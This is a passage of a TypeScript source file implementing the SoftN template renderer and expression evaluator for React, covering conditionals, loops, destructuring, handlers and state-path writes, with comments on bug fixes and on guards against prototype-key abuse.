  if (node.fallback && node.fallback.length > 0) {
    return reusableFragment(
      node,
      'slot',
      key,
      key,
      renderNodes(node.fallback, context, registry, `${key ?? ''}-slot-fallback-${slotName}`)
    );
  }

  // No content and no fallback
  return null;
}

/**
 * Render a text node
 */
function renderText(node: TextNode, key?: number | string): React.ReactNode {
  const active = pass;
  if (active && typeof key === 'string') {
    const before = recall(active, key, node, 'text');
    if (before) {
      keep(active, key, before);
      return before.result;
    }
    const result = React.createElement(React.Fragment, { key }, node.content);
    keep(active, key, { node, kind: 'text', result });
    return result;
  }
  // Use React.Fragment to properly handle text nodes
  return React.createElement(React.Fragment, { key }, node.content);
}

/**
 * Render an expression node (interpolation)
 */
function renderExpression(
  node: ExpressionNode,
  context: SoftNRenderContext,
  key?: number | string
): React.ReactNode {
  let value: unknown;
  try {
    value = evaluateExpression(node.expression, context);
  } catch {
    return null; // Gracefully handle expression evaluation errors
  }
  // Booleans render as nothing, as they do in JSX. `{ready && "Go"}` yields
  // `false` when the guard fails, and printing that put the word "false" in the
  // UI — which is what the idiom is meant to avoid. A bundle that wants to show
  // one can ask for it with `{String(flag)}`.
  const text = value == null || typeof value === 'boolean' ? '' : String(value);
  const active = pass;
  if (active && typeof key === 'string') {
    const before = recall(active, key, node, 'expression');
    if (before && before.text === text) {
      keep(active, key, before);
      return before.result;
    }
    const result = React.createElement(React.Fragment, { key }, text);
    keep(active, key, { node, kind: 'expression', result, text });
    return result;
  }
  return React.createElement(React.Fragment, { key }, text);
}

/**
 * Render an if block
 *
 * Uses unique keys to force React to completely unmount and remount content
 * when switching between conditional branches.
 */
/**
 * Extract a descriptive identifier from a condition expression
 * Used to generate more unique keys for conditional branches
 */
function getConditionIdentifier(condition: Expression): string {
  if (condition.type === 'BinaryExpression') {
    // For comparisons like `currentPage === "dashboard"`, extract the right value
    if (condition.operator === '===' || condition.operator === '==') {
      // Read a literal operand directly instead of evaluating it. This only
      // builds a React key, and the condition has already been evaluated by the
      // caller — evaluating the operand again ran any call inside it a second
      // time on every render.
      if (condition.right.type === 'Literal') {
        const rightValue = condition.right.value;
        if (typeof rightValue === 'string' || typeof rightValue === 'number') {
          return String(rightValue);
        }
      }
    }
  }
  // For identifiers, use the name
  if (condition.type === 'Identifier') {
    return condition.name;
  }
  return 'cond';
}

function renderIfBlock(
  node: IfBlock,
  context: SoftNRenderContext,
  registry: ComponentRegistry,
  key?: number | string,
  branchPath: string = ''
): React.ReactNode {
  const condition = evaluateStructural(node.condition, context, false, '#if condition');

  // Get a unique identifier for the condition value
  const conditionId = getConditionIdentifier(node.condition);

  // Get currentPage for making keys truly unique across navigation
  const currentPage = context.state['currentPage'] ?? 'unknown';

  // Get the source line number to make keys truly unique across different #if blocks
  const conditionLine = node.loc?.line ?? 0;

  if (condition) {
    // Build a unique key that identifies THIS specific branch
    // Include conditionLine to distinguish #if blocks at same position in different parents
    // Include currentPage to force remount when navigating
    const branchKey = `softn-if-${key ?? '0'}-L${conditionLine}-${conditionId}-${currentPage}${branchPath}`;

    // Render the children
    const children = renderNodes(node.consequent, context, registry, branchKey);

    // Use React.Fragment with key to avoid DOM pollution and ensure proper React reconciliation
    // The key forces React to unmount/remount when switching between branches
    return reusableFragment(node, 'branch', branchKey, branchKey, children);
  }

  if (node.alternate) {
    if (Array.isArray(node.alternate)) {
      // #else branch
      const branchKey = `softn-if-${key ?? '0'}-L${conditionLine}-else-${currentPage}${branchPath}`;
      const children = renderNodes(node.alternate, context, registry, branchKey);

      return reusableFragment(node, 'branch', branchKey, branchKey, children);
    } else {
      // Chained #elseif - extend the path to track which elseif branch we're in
      return renderIfBlock(node.alternate, context, registry, key, branchPath + '-elif');
    }
  }

  return null;
}

/**
 * The most a count may be in `#each (n in count)`. A count comes from state,
 * and one that is wrong by a few orders of magnitude should not be a page
 * that never finishes drawing.
 */
const MAX_EACH_COUNT = 100_000;

/** What an `#each` goes through: its items in order and, for a record, the key of each. */
interface Iteration {
  items: readonly unknown[];
  keys?: readonly string[];
}

const NOTHING_TO_ITERATE: Iteration = { items: [] };

/**
 * What `#each` goes through for a value.
 *
 * A list is its items. So is anything else that holds several things: a
 * Set's members and a Map's `[key, value]` pairs, in the order JavaScript
 * gives them; a record's values, with the key where a list has the index;
 * and a whole number, which counts from 1. These used to draw the `#empty`
 * branch as though they held nothing, which for a Set built in the template
 * (`new Set(tags)`) said the opposite of the truth.
 *
 * Text is not a list of its characters here: a string where a list was
 * expected is a list that has not arrived in the right shape, and the empty
 * branch is the right thing to draw for it.
 */
function iterationOf(value: unknown): Iteration {
  if (Array.isArray(value)) return { items: value };
  if (typeof value === 'number') {
    if (!Number.isInteger(value) || value < 1 || value > MAX_EACH_COUNT) return NOTHING_TO_ITERATE;
    const items = new Array<number>(value);
    for (let i = 0; i < value; i++) items[i] = i + 1;
    return { items };
  }
  if (value === null || typeof value !== 'object') return NOTHING_TO_ITERATE;
  if (typeof (value as { [Symbol.iterator]?: unknown })[Symbol.iterator] === 'function') {
    return { items: Array.from(value as Iterable<unknown>) };
  }
  if (isPlainObject(value)) {
    const keys = Object.keys(value).filter((key) => !BLOCKED_MEMBER_KEYS.has(key));
    return { items: keys.map((key) => value[key]), keys };
  }
  return NOTHING_TO_ITERATE;
}

/** Loops already told that their count is not one. */
const reportedEachCounts = new WeakSet<object>();

/** Say, once, that a number given to `#each` is not a count it can make. */
function reportEachCount(node: object, value: unknown, what: string): void {
  if (typeof value !== 'number' || value === 0 || reportedEachCounts.has(node)) return;
  if (Number.isInteger(value) && value >= 1 && value <= MAX_EACH_COUNT) return;
  reportedEachCounts.add(node);
  console.error(
    `[SoftN] ${what} was given the number ${value}, which is not a count it can go through: ` +
      `a count is a whole number from 0 to ${MAX_EACH_COUNT}. Nothing was drawn for it.`
  );
}

/**
 * The names one loop binds, and how a pass of it is laid over what was bound
 * around it. Made once for a drawing of the loop, not once a row.
 */
interface LoopBinding {
  names: readonly string[];
  /** For each name, what follows the item's own place in state; see SoftNLocalScope. */
  suffixes: readonly (string | undefined)[];
  /** The values of `names` for this item and its index or key. */
  values: (item: unknown, second: number | string) => unknown[];
}

function loopBinding(
  itemName: string,
  indexName: string | undefined,
  itemPattern?: BindingPattern
): LoopBinding {
  if (itemPattern) {
    // `#each ({ id, title } in tasks)`: each name is bound to its part of
    // the item, and knows its part of the item's place in state.
    const names = patternNames(itemPattern);
    const suffixes: Array<string | undefined> = [];
    patternSuffixes(itemPattern, '', suffixes);
    if (indexName) {
      names.push(indexName);
      suffixes.push(undefined);
    }
    return {
      names,
      suffixes,
      values: (item, second) => {
        const values: unknown[] = [];
        takeApart(itemPattern, item, values);
        if (indexName) values.push(second);
        return values;
      },
    };
  }
  return indexName
    ? { names: [itemName, indexName], suffixes: ['', undefined], values: (item, second) => [item, second] }
    : { names: [itemName], suffixes: [''], values: (item) => [item] };
}

/** The context one pass of a loop is drawn in. */
function loopPassContext(
  context: SoftNRenderContext,
  binding: LoopBinding,
  list: string | null,
  item: unknown,
  index: number,
  recordKey: string | undefined
): SoftNRenderContext {
  const second = recordKey ?? index;
  return {
    ...context,
    locals: {
      names: binding.names,
      values: binding.values(item, second),
      list: list ?? undefined,
      position: second,
      suffixes: binding.suffixes,
      parent: context.locals,
    },
    each: { item, index, key: recordKey ?? String(index) },
  };
}

/**
 * Render an each block
 */
function renderEachBlock(
  node: EachBlock,
  context: SoftNRenderContext,
  registry: ComponentRegistry,
  key?: number | string
): React.ReactNode {
  const iterable = evaluateStructural(node.iterable, context, [], '#each iterable');
  const { items, keys } = iterationOf(iterable);

  if (items.length === 0) {
    reportEachCount(node, iterable, '#each');
    if (node.emptyFallback) {
      return reusableFragment(
        node,
        'empty',
        key,
        key,
        renderNodes(node.emptyFallback, context, registry, `${key}-empty`)
      );
    }
    return null;
  }

  const binding = loopBinding(node.itemName, node.indexName, node.itemPattern);
  const list = writableListPath(node.iterable, context);

  // Warn in development if using index as key for items that might have state
  if (!node.keyExpression && !keys && isDevelopment) {
    console.warn(
      `[SoftN] Each block without key expression detected. Consider adding a key for better performance: ` +
        `#each (${node.itemName}${node.indexName ? `, ${node.indexName}` : ''} in iterable) key={${node.itemName}.id}`
    );
  }

  const renderedItems = items.map((item, index) => {
    const iterContext = loopPassContext(context, binding, list, item, index, keys?.[index]);

    // `key={…}` is worked out with the row's own names bound, the index among
    // them. Without it, `#each (row, i in rows) key={i}` evaluated `i` against
    // a state that had never heard of it: every row got the key "undefined",
    // React warned about duplicate children, and component state attached to
    // whichever row happened to be matched — so editing one row's input moved
    // the text to another when the list reordered.
    const itemKey = node.keyExpression
      ? String(evaluateExpression(node.keyExpression, iterContext))
      : (iterContext.each?.key ?? String(index));
    if (node.keyExpression && iterContext.each) iterContext.each.key = itemKey;

    const rowKey = `${key}-item-${itemKey}`;
    const children = renderNodes(node.body, iterContext, registry, rowKey);

    return reusableFragment(node, 'row', rowKey, itemKey, children);
  });

  return reusableFragment(node, 'each', key, key, renderedItems);
}

/** A value as the list a list pattern takes apart: a list is itself, a Set or Map its members. */
function listToTakeApart(value: unknown): readonly unknown[] {
  if (Array.isArray(value)) return value;
  if (
    value !== null &&
    typeof value === 'object' &&
    typeof (value as { [Symbol.iterator]?: unknown })[Symbol.iterator] === 'function'
  ) {
    return Array.from(value as Iterable<unknown>);
  }
  return [];
}

/**
 * Take `value` apart by `pattern`, pushing what each name is bound to onto
 * `values` in the order `patternNames` lists the names.
 *
 * Where JavaScript would throw (a list pattern given a number, a record
 * pattern given null) every name is `undefined`: a template meets data that
 * has not arrived far more often than data of the wrong kind. Keys are read
 * under the rule a member access is, so `{ constructor }` binds nothing.
 *
 * `defaults` evaluates a default; it is absent for an `#each`, whose
 * patterns have none.
 */
function takeApart(
  pattern: BindingPattern,
  value: unknown,
  values: unknown[],
  defaults?: (expr: Expression) => unknown
): void {
  // As markup holds it (host-values.ts), at every depth: `({ view: { eval } })`
  // would otherwise read through an event to the window inside one pattern.
  value = markupValue(value);
  if (pattern.type === 'NamePattern') {
    values.push(value);
    return;
  }
  if (pattern.type === 'ArrayPattern') {
    const list = listToTakeApart(value);
    for (let i = 0; i < pattern.elements.length; i++) bindTarget(pattern.elements[i], list[i], values, defaults);
    if (pattern.rest) takeApart(pattern.rest, list.slice(pattern.elements.length), values, defaults);
    return;
  }
  const record = value === null || value === undefined ? undefined : (value as Record<string, unknown>);
  for (const property of pattern.properties) {
    const key = getSafeMemberKey(property.key);
    bindTarget(property.value, record !== undefined && key !== null ? record[key] : undefined, values, defaults);
  }
  if (pattern.rest !== undefined) {
    const rest: Record<string, unknown> = {};
    if (record !== undefined && typeof record === 'object') {
      const taken = new Set(pattern.properties.map((property) => property.key));
      for (const key of Object.keys(record)) {
        if (!taken.has(key) && !BLOCKED_MEMBER_KEYS.has(key)) rest[key] = record[key];
      }
    }
    values.push(rest);
  }
}

function bindTarget(
  target: BindingTarget,
  value: unknown,
  values: unknown[],
  defaults?: (expr: Expression) => unknown
): void {
  takeApart(
    target.pattern,
    value === undefined && target.default && defaults ? defaults(target.default) : value,
    values,
    defaults
  );
}

/**
 * What an arrow's names are bound to for a call, when its parameters are
 * more than names. A default is evaluated with the parameters before it
 * already bound, as in JavaScript (`(a, b = a) => …`).
 */
function boundParams(
  expr: ArrowFunctionExpression,
  args: unknown[],
  context: SoftNRenderContext,
  locals: SoftNLocalScope | undefined,
  depth: number
): unknown[] {
  const values: unknown[] = [];
  // The layer the body will see, already in place for the defaults: a name
  // not bound yet is past the end of `values`, and reads as undefined.
  const scope: SoftNLocalScope = { names: expr.params, values, parent: locals };
  const defaults = (expression: Expression) => evaluate(expression, context, scope, depth + 1);
  const patterns = expr.patterns ?? [];
  for (let i = 0; i < patterns.length; i++) {
    const param = patterns[i];
    if (param.rest) takeApart(param.pattern, args.slice(i), values, defaults);
    else bindTarget(param, args[i], values, defaults);
  }
  return values;
}

/**
 * For each name a pattern binds, what follows the item's own place in state:
 * `.title` for `{ title }`, `[0]` for the first of `[a, b]`. A name with no
 * place of its own (a rest, a key a path cannot spell) is `undefined`.
 */
function patternSuffixes(pattern: BindingPattern, prefix: string | undefined, into: Array<string | undefined>): void {
  if (pattern.type === 'NamePattern') {
    into.push(prefix);
    return;
  }
  if (pattern.type === 'ArrayPattern') {
    pattern.elements.forEach((element, i) =>
      patternSuffixes(element.pattern, prefix === undefined ? undefined : `${prefix}[${i}]`, into)
    );
    if (pattern.rest) patternSuffixes(pattern.rest, undefined, into);
    return;
  }
  for (const property of pattern.properties) {
    const step = isIdentifierName(property.key) ? `.${property.key}` : pathStep(property.key);
    patternSuffixes(property.value.pattern, prefix === undefined || step === null ? undefined : prefix + step, into);
  }
  if (pattern.rest !== undefined) into.push(undefined);
}

/**
 * Evaluate an expression in the given context
 * Includes recursion depth tracking to prevent infinite loops
 */
export function evaluateExpression(
  expr: Expression,
  context: SoftNRenderContext,
  depth: number = 0
): unknown {
  return evaluate(expr, context, context.locals, depth);
}

/**
 * The evaluator itself. `locals` is what the template has bound here: it
 * starts as the context's (the loops around the expression) and gains a
 * layer for each arrow called, which is why it is passed beside the context
 * rather than read from it. A call of an arrow then costs one small layer,
 * where it used to copy the context and every state variable in it.
 */
function evaluate(
  expr: Expression,
  context: SoftNRenderContext,
  locals: SoftNLocalScope | undefined,
  depth: number
): unknown {
  // Prevent infinite recursion
  if (depth > MAX_EVAL_DEPTH) {
    if (isDevelopment) {
      console.error(
        '[SoftN] Maximum expression evaluation depth exceeded. Possible circular reference.'
      );
    }
    return undefined;
  }

  switch (expr.type) {
    case 'Identifier':
      // What the template bound itself comes first: a loop variable or an
      // arrow's parameter hides a state variable of the same name.
      for (let scope = locals; scope; scope = scope.parent) {
        const at = scope.names.indexOf(expr.name);
        if (at !== -1) return markupValue(scope.values[at]);
      }
      // Then state, data, computed, props, functions, then JS globals.
      //
      // Own keys only: these are plain objects, so `in` also answered yes for
      // everything on Object.prototype, and an identifier named `constructor`
      // resolved to `Object` itself — from which `defineProperty(__proto__, …)`
      // is a short step to running arbitrary code from a template.
      if (Object.hasOwn(context.state, expr.name)) {
        return markupValue(context.state[expr.name]);
      }
      if (Object.hasOwn(context.data, expr.name)) {
        return markupValue(context.data[expr.name]);
      }
      if (Object.hasOwn(context.computed, expr.name)) {
        // A computed is stored as a thunk — `() => callComputed(name)` — because
        // its value has to be re-derived whenever the state it reads moves.
        // Returning the thunk handed the template the function instead of the
        // value, so `#each (todo in filteredTodos)` iterated a function and
        // rendered its source into the page:
        //   (...r)=>{let i={...t,state:{...t.state}};if(e.para
        const value = context.computed[expr.name];
        return markupValue(typeof value === 'function' ? (value as () => unknown)() : value);
      }
      if (Object.hasOwn(context.props, expr.name)) {
        return markupValue(context.props[expr.name]);
      }
      if (Object.hasOwn(context.functions, expr.name)) {
        return context.functions[expr.name];
      }
      if (Object.hasOwn(JS_GLOBALS, expr.name)) {
        return JS_GLOBALS[expr.name];
      }
      // Identifier not found - return undefined (data may not be loaded yet)
      return undefined;

    case 'Literal':
      return expr.value;

    case 'BinaryExpression': {
      // Short-circuit operators must evaluate right side lazily
      if (expr.operator === '&&') {
        const left = evaluate(expr.left, context, locals, depth + 1);
        return left ? evaluate(expr.right, context, locals, depth + 1) : left;
      }
      if (expr.operator === '||') {
        const left = evaluate(expr.left, context, locals, depth + 1);
        return left ? left : evaluate(expr.right, context, locals, depth + 1);
      }
      if (expr.operator === '??') {
        const left = evaluate(expr.left, context, locals, depth + 1);
        return left != null ? left : evaluate(expr.right, context, locals, depth + 1);
      }

      const left = evaluate(expr.left, context, locals, depth + 1);
      const right = evaluate(expr.right, context, locals, depth + 1);

      switch (expr.operator) {
        case '+':
          if (typeof left === 'string' || typeof right === 'string') {
            return String(left ?? '') + String(right ?? '');
          }
          return (left as number) + (right as number);
        case '-':
          return (left as number) - (right as number);
        case '*':
          return (left as number) * (right as number);
        case '/':
          return (left as number) / (right as number);
        case '%':
          return (left as number) % (right as number);
        case '**':
          return (left as number) ** (right as number);
        case 'in': {
          // JavaScript throws for a right side that is not an object; a
          // template asks this of data that has not loaded yet.
          if (right === null || (typeof right !== 'object' && typeof right !== 'function')) {
            return false;
          }
          const key = getSafeMemberKey(left);
          return key !== null && key in (right as object);
        }
        case '==':
          return left == right;
        case '!=':
          return left != right;
        case '===':
          return left === right;
        case '!==':
          return left !== right;
        case '<':
          return (left as number) < (right as number);
        case '>':
          return (left as number) > (right as number);
        case '<=':
          return (left as number) <= (right as number);
        case '>=':
          return (left as number) >= (right as number);
        case 'instanceof':
          return typeof right === 'function'
            ? left instanceof (right as new (...args: unknown[]) => unknown)
            : false;
        default:
          return undefined;
      }
    }

    case 'UnaryExpression': {
      const arg = evaluate(expr.argument, context, locals, depth + 1);

      switch (expr.operator) {
        case '!':
          return !arg;
        case '-':
          return -(arg as number);
        case '+':
          return +(arg as number);
        case 'typeof':
          return typeof arg;
        case 'void':
          return void arg;
        default:
          return undefined;
      }
    }

    case 'MemberExpression': {
      const obj = evaluate(expr.object, context, locals, depth + 1);

      // Handle optional chaining - return undefined if object is null/undefined
      // This gracefully handles cases like {selectedItem.name} when selectedItem is null
      if (obj == null) {
        return undefined;
      }

      // Handle primitive types that can have methods (string, number)
      const target = obj as Record<string, unknown>;

      if (expr.computed) {
        const prop = evaluate(expr.property, context, locals, depth + 1);
        const safeKey = getSafeMemberKey(prop);
        if (safeKey === null) return undefined;
        return markupValue(target[safeKey]);
      } else if (expr.property.type === 'Identifier') {
        const safeKey = getSafeMemberKey(expr.property.name);
        if (safeKey === null) return undefined;
        return markupValue(target[safeKey]);
      }

      return undefined;
    }

    case 'CallExpression': {
      // For method calls (e.g., arr.filter(...)), preserve `this` binding
      let fn: unknown;
      let thisObj: unknown = undefined;

      if (expr.callee.type === 'MemberExpression') {
        thisObj = evaluate(expr.callee.object, context, locals, depth + 1);
        if (thisObj != null) {
          const target = thisObj as Record<string, unknown>;
          if (expr.callee.computed) {
            const prop = evaluate(expr.callee.property, context, locals, depth + 1);
            const safeKey = getSafeMemberKey(prop);
            if (safeKey === null) {
              fn = undefined;
            } else {
              fn = target[safeKey];
            }
          } else if (expr.callee.property.type === 'Identifier') {
            const safeKey = getSafeMemberKey(expr.callee.property.name);
            if (safeKey === null) {
              fn = undefined;
            } else {
              fn = target[safeKey];
            }
          }
        }
      } else {
        fn = evaluate(expr.callee, context, locals, depth + 1);
      }

      // Handle optional chaining - return undefined if function is null/undefined
      if (fn == null) {
        if (expr.optional) {
          return undefined;
        }
        // Only warn if the script has finished loading. Before loadScript() completes,
        // functions are not yet available — this is normal and not worth warning about.
        if (context.scriptLoaded) {
          const funcName =
            expr.callee.type === 'Identifier'
              ? expr.callee.name
              : expr.callee.type === 'MemberExpression' && expr.callee.property.type === 'Identifier'
                ? expr.callee.property.name
                : 'unknown';
          console.warn(
            `[SoftN] Function "${funcName}" not found. Callee evaluated to ${fn === null ? 'null' : 'undefined'}`
          );
        }
        return undefined;
      }

      const args = evaluateArguments(expr.arguments, context, locals, depth + 1);

      if (typeof fn === 'function') {
        if (fn === Function) {
          return undefined;
        }
        // Bind `this` for method calls (arr.filter, str.toUpperCase, etc.)
        return markupValue(thisObj != null ? fn.apply(thisObj, args) : fn(...args));
      }

      return undefined;
    }

    case 'ConditionalExpression': {
      const test = evaluate(expr.test, context, locals, depth + 1);
      return test ? evaluate(expr.consequent, context, locals, depth + 1) : evaluate(expr.alternate, context, locals, depth + 1);
    }

    case 'UpdateExpression': {
      // `count++` writes through the same path an assignment does, so
      // `rows[i].qty++` inside an #each changes that row.
      const path = getExpressionPath(expr.argument, context, locals);
      if (!path) {
        if (!reportUnplacedWrite(expr.argument, locals) && isDevelopment) {
          console.error(`[SoftN] Cannot apply "${expr.operator}" to this expression; it must be a name or a property path.`);
        }
        return undefined;
      }
      const current = Number(evaluate(expr.argument, context, locals, depth + 1));
      const next = expr.operator === '++' ? current + 1 : current - 1;
      if (stateWriteAllowed(expr, `"${expr.operator}"`)) context.setState(path, next);
      return expr.prefix ? next : current;
    }

    case 'NewExpression': {
      const ctor = evaluate(expr.callee, context, locals, depth + 1);
      if (!CONSTRUCTIBLE.has(ctor)) {
        if (isDevelopment) {
          console.error('[SoftN] "new" in a template constructs Date, Array, Map or Set only; build anything else in a logic function.');
        }
        return undefined;
      }
      const args = evaluateArguments(expr.arguments, context, locals, depth + 1);
      return new (ctor as new (...a: unknown[]) => unknown)(...args);
    }

    case 'AssignmentExpression': {
      // `count = count + 1` in a handler: the parser reads it whole now, and
      // the write goes through the same setState a `:value` binding uses, at
      // the same resolved path — so `todos[i].done = true` inside an #each
      // writes the row, not a key called "i". A target that is not a state
      // path (a call, a literal) is a parse-time diagnostic; here it is
      // reported once and the assignment is a no-op rather than a throw that
      // would take the whole handler down.
      const path = getExpressionPath(expr.left, context, locals);
      if (!path) {
        if (!reportUnplacedWrite(expr.left, locals) && isDevelopment) {
          console.error('[SoftN] Cannot assign to this expression; the left side must be a name or a property path.');
        }
        return undefined;
      }
      const right = evaluate(expr.right, context, locals, depth + 1);
      let value: unknown;
      switch (expr.operator) {
        case '=':
          value = right;
          break;
        case '??=': {
          const current = evaluate(expr.left, context, locals, depth + 1);
          if (current !== null && current !== undefined) return current;
          value = right;
          break;
        }
        case '||=': {
          const current = evaluate(expr.left, context, locals, depth + 1);
          if (current) return current;
          value = right;
          break;
        }
        case '&&=': {
          const current = evaluate(expr.left, context, locals, depth + 1);
          if (!current) return current;
          value = right;
          break;
        }
        default: {
          const current = evaluate(expr.left, context, locals, depth + 1);
          const a = current as number;
          const b = right as number;
          value =
            expr.operator === '+='
              ? typeof current === 'string' || typeof right === 'string'
                ? String(current) + String(right)
                : a + b
              : expr.operator === '-='
                ? a - b
                : expr.operator === '*='
                  ? a * b
                  : expr.operator === '/='
                    ? a / b
                    : expr.operator === '**='
                      ? a ** b
                      : a % b;
        }
      }
      if (stateWriteAllowed(expr, `The assignment "${expr.operator}"`)) context.setState(path, value);
      return value;
    }

    case 'ArrowFunctionExpression': {
      return (...given: unknown[]) => {
        // Whoever calls this (an event, a component's callback, `list.map`)
        // may hand it a piece of the browser; markup holds none
        // (host-values.ts).
        const args = given.map(markupValue);
        // The parameters are a layer over what was bound where the arrow
        // was written. An argument that was not passed is `undefined`, which
        // is what reading past the end of `args` gives.
        const values = () => (expr.patterns ? boundParams(expr, args, context, locals, depth) : args);

        if (expr.statements) {
          // A block body, `{ count++; save() }`: each statement in turn, as
          // the expressions they are, under the same rules. A write to state
          // is made from a handler and refused while the page is drawn
          // (stateWriteAllowed), as for any expression. The page's state is
          // written when React next draws it, so the block reads its own
          // writes from a copy kept here: `n = n + 1; n++` adds two.
          const state: Record<string, unknown> = { ...context.state };
          const block: SoftNRenderContext = {
            ...context,
            state,
            setState: (path, value) => {
              const parts = parseStatePath(path);
              writeStatePath(state, parts, value);
              context.setState(path, value);
              // And to the logic, for a function a later statement calls.
              if (parts.length > 0) context.shareState?.({ [parts[0]]: state[parts[0]] });
            },
          };
          const scope = { names: expr.params, values: values(), parent: locals };
          for (const statement of expr.statements) evaluate(statement, block, scope, depth + 1);
          return expr.returns ? evaluate(expr.returns, block, scope, depth + 1) : undefined;
        }

        if (typeof expr.body === 'string') {
          // A block body with a statement markup does not read (`if`, `let`,
          // a loop) runs nothing; the parser said which and why. It used to
          // fail in complete silence, so it says so here as well, when it is
          // pressed, where a person is looking.
          console.error(
            `[SoftN] This handler did not run: its { } body has a statement markup does not read ` +
              `(${expr.body.replace(/\s+/g, ' ').slice(0, 80)}). Put it in a <logic> function and call that.`
          );
          return undefined;
        }

        return evaluate(expr.body, context, { names: expr.params, values: values(), parent: locals }, depth + 1);
      };
    }

    case 'ObjectExpression': {
      const obj: Record<string, unknown> = {};
      for (const prop of expr.properties) {
        if (prop.type === 'SpreadElement') {
          // `{ ...base, color: "red" }`: own enumerable keys, in order, under
          // the same key rule as a written property. Nothing to spread (data
          // not loaded yet, a number) contributes nothing.
          const source = evaluate(prop.argument, context, locals, depth + 1);
          if (source !== null && typeof source === 'object') {
            for (const key of Object.keys(source)) {
              if (BLOCKED_MEMBER_KEYS.has(key)) continue;
              obj[key] = (source as Record<string, unknown>)[key];
            }
          }
          continue;
        }
        if (prop.computedKey) {
          // `{ [field]: value }`. The key goes through the rule every key
          // read from a template goes through, so one that works out to
          // `__proto__` sets nothing rather than the object's prototype.
          const key = getSafeMemberKey(evaluate(prop.computedKey, context, locals, depth + 1));
          const value = evaluate(prop.value, context, locals, depth + 1);
          if (key !== null) obj[key] = value;
          continue;
        }
        // Prevent prototype pollution from user expressions
        if (prop.key === '__proto__' || prop.key === 'constructor' || prop.key === 'prototype') continue;
        obj[prop.key] = evaluate(prop.value, context, locals, depth + 1);
      }
      return obj;
    }

    case 'ArrayExpression': {
      return evaluateArguments(expr.elements, context, locals, depth + 1);
    }

    case 'SpreadElement': {
      // Spread elements should be handled in their parent context (object/array)
      const value = evaluate(expr.argument, context, locals, depth + 1);
      return value;
    }

    case 'TemplateLiteral': {
      // Template literal: combine quasis and expressions
      let result = '';
      const quasis = expr.quasis || [];
      const expressions = expr.expressions || [];

      for (let i = 0; i < quasis.length; i++) {
        const q = quasis[i];
        // quasis[i] may be a TemplateElement object or a plain string
        result += typeof q === 'string' ? q : (q?.value?.cooked ?? q?.value?.raw ?? String(q ?? ''));
        if (i < expressions.length) {
          result += String(evaluate(expressions[i], context, locals, depth + 1) ?? '');
        }
      }
      return result;
    }

    default:
      return undefined;
  }
}

/** `[3]` or `["theme"]`: one step of a state path, or null for a key a path cannot spell. */
function pathStep(position: number | string): string | null {
  if (typeof position === 'number') return `[${position}]`;
  // The path is split on `]` and has its quotes taken off, so a key holding
  // either cannot be written back whole, and an empty one is dropped.
  return position === '' || /["'\]]/.test(position) ? null : `["${position}"]`;
}

/** Where in the app's state the value of `scope.names[at]` lives, or null when it has no place there. */
function placeInState(scope: SoftNLocalScope, at: number): string | null {
  const suffix = scope.suffixes?.[at];
  if (scope.list === undefined || scope.position === undefined || suffix === undefined) return null;
  const step = pathStep(scope.position);
  return step === null ? null : scope.list + step + suffix;
}

/**
 * The path of a list an `#each` goes through, when it is one a row can be
 * written back to: a path whose first name is a state variable, or a prop
 * (which the binding hands to the parent's handler). A collection's records
 * and a computed value read the same way and are not state: writing at
 * `notes[0].title` would make a state variable called `notes` that hides the
 * collection. The order is the one a name is looked up in.
 */
function writableListPath(expr: Expression, context: SoftNRenderContext): string | null {
  const path = getExpressionPath(expr, context);
  if (!path) return null;
  const end = path.search(/[.[]/);
  const root = end === -1 ? path : path.slice(0, end);
  if (Object.hasOwn(context.state, root)) return path;
  if (Object.hasOwn(context.data, root) || Object.hasOwn(context.computed, root)) return null;
  return Object.hasOwn(context.props, root) ? path : null;
}

/** An assignment target as it was written, for a message: `todo.done`, `rows[i].qty`. */
function spelledTarget(expr: Expression): string {
  if (expr.type === 'Identifier') return expr.name;
  if (expr.type === 'MemberExpression') {
    const object = spelledTarget(expr.object);
    if (!expr.computed && expr.property.type === 'Identifier') return `${object}.${expr.property.name}`;
    if (expr.property.type === 'Identifier') return `${object}[${expr.property.name}]`;
    if (expr.property.type === 'Literal') return `${object}[${expr.property.raw}]`;
    return `${object}[…]`;
  }
  return '…';
}

/** Targets already reported as having no place in state. */
const reportedUnplacedWrites = new WeakSet<object>();

/**
 * Report, once, a write whose target starts from a name the template bound
 * and that has no place in the app's state. True when that is what `target`
 * is (reported now or before); false when it is something else, which the
 * caller has its own words for.
 *
 * Not kept to development: the control or button this is behind looks
 * ordinary and does nothing, and this line is the only thing that says why.
 */
function reportUnplacedWrite(target: Expression, locals: SoftNLocalScope | undefined): boolean {
  let root = target;
  while (root.type === 'MemberExpression') root = root.object;
  if (root.type !== 'Identifier') return false;
  const name = root.name;
  let bound = false;
  for (let scope = locals; scope && !bound; scope = scope.parent) bound = scope.names.includes(name);
  if (!bound) return false;
  if (!reportedUnplacedWrites.has(target)) {
    reportedUnplacedWrites.add(target);
    console.error(
      `[SoftN] "${spelledTarget(target)}" on line ${target.loc?.line ?? '?'} was not written: "${name}" is a name ` +
        'the page itself bound (an item of a list that is worked out in the page or is not the app’s state, ' +
        'a loop’s index, or an arrow’s parameter), so there is nowhere in state to write it. ' +
        'Loop over the state list itself, or make the change in a logic function.'
    );
  }
  return true;
}

/**
 * Get the path string from an expression (for state updates)
 * Supports complex paths including computed properties and optional chaining
 */
function getExpressionPath(
  expr: Expression,
  context?: SoftNRenderContext,
  locals: SoftNLocalScope | undefined = context?.locals
): string | null {
  if (expr.type === 'Identifier') {
    // A name the template bound is not a state variable. An `#each` variable
    // over a list in state stands for a place in that list, and the path is
    // that place; anything else bound here (an index, an arrow's parameter,
    // an item of a list that was worked out) has no place to write to.
    // Answering with the name, as this did, wrote a state variable called
    // after the loop variable.
    for (let scope = locals; scope; scope = scope.parent) {
      const at = scope.names.indexOf(expr.name);
      if (at !== -1) return placeInState(scope, at);
    }
    return expr.name;
  }

  if (expr.type === 'MemberExpression') {
    const objectPath = getExpressionPath(expr.object, context, locals);
    if (!objectPath) return null;

    if (!expr.computed && expr.property.type === 'Identifier') {
      return `${objectPath}.${expr.property.name}`;
    }

    // Handle computed properties like items[0] or items[index]
    if (expr.computed) {
      if (expr.property.type === 'Literal') {
        const key = expr.property.value;
        if (typeof key === 'number') {
          return `${objectPath}[${key}]`;
        }
        if (typeof key === 'string') {
          return `${objectPath}["${key}"]`;
        }
      }
      if (expr.property.type === 'Identifier') {
        // Resolve the index, do not name it.
        //
        // This returned `todos[i]` — the identifier's spelling — so a :bind
        // inside `#each (todo, i in todos)` wrote every row's edit to a literal
        // key called "i". The real row was never touched and a junk entry
        // appeared beside the list, so typing in the second row changed nothing
        // visible and quietly corrupted the data behind it.
        if (context) {
